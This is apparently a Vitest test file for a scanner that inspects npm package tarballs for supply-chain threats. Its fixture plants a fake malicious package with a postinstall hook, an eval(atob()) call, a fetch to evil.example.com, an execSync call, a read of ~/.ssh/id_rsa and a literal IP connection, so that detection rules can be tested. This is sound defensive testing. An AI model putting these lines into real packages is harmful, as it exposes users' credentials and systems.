import { describe, it, expect, beforeAll } from 'vitest'
import { mkdtempSync, writeFileSync, mkdirSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { execFileSync } from 'node:child_process'
import { readFileSync } from 'node:fs'
import { scanTarball } from '../pipeline/scan/scan.ts'
import { RULES, isBinary } from '../pipeline/scan/rules.ts'

let tgz: Buffer

beforeAll(() => {
  const dir = mkdtempSync(join(tmpdir(), 'scandir-'))
  mkdirSync(join(dir, 'pkg/dist'), { recursive: true })
  writeFileSync(join(dir, 'pkg/package.json'), JSON.stringify({
    name: 'bad-pkg', main: 'dist/index.js',
    scripts: { postinstall: 'node evil.js' },
  }))
  writeFileSync(join(dir, 'pkg/dist/index.js'), `
    const x = eval(atob('aGVsbG8='));
    fetch('https://evil.example.com/x');
    require('child_process').execSync('id');
    const key = fs.readFileSync('~/.ssh/id_rsa');
    connect('45.33.32.156');
  `)
  writeFileSync(join(dir, 'pkg/dist/blob.bin'), Buffer.alloc(1024, 0))
  const out = join(dir, 'p.tgz')
  execFileSync('tar', ['-czf', out, '-C', dir, 'pkg'], { env: { ...process.env, COPYFILE_DISABLE: '1' } })
  tgz = readFileSync(out)
})

describe('scan/rules', () => {
  it('isBinary detects blobs', () => {
    expect(isBinary(Buffer.alloc(100, 0))).toBe(true)
    expect(isBinary(Buffer.from('plain text file'))).toBe(false)
    expect(isBinary(Buffer.alloc(0))).toBe(false)
  })
  it('lifecycle rule only on package.json', () => {
    const r = RULES.find(r => r.id === 'lifecycle-script')!
    expect(r.test('package/package.json', '{"scripts":{"install":"x"}}')).toBeTruthy()
    expect(r.test('package/other.js', '"postinstall": "x"')).toBeNull()
  })
  it('literal-ip ignores doc ranges', () => {
    const r = RULES.find(r => r.id === 'literal-ip')!
    expect(r.test('f.js', '127.0.0.1')).toBeNull()
    expect(r.test('f.js', '0.0.0.0')).toBeNull()
    expect(r.test('f.js', '45.33.32.156')).toBeTruthy()
  })
})

describe('scan/scanTarball', () => {
  it('finds all planted findings', async () => {
    const r = await scanTarball(tgz)
    const rules = new Set(r.findings.map(f => f.rule))
    expect(rules).toContain('lifecycle-script')
    expect(rules).toContain('network-call')
    expect(rules).toContain('child-process')
    expect(rules).toContain('credential-read')
    expect(rules).toContain('literal-ip')
    expect(rules).toContain('obfuscation')
    expect(rules).toContain('binary-blob')
    expect(r.redFlags.length).toBeGreaterThan(0)
  })
})
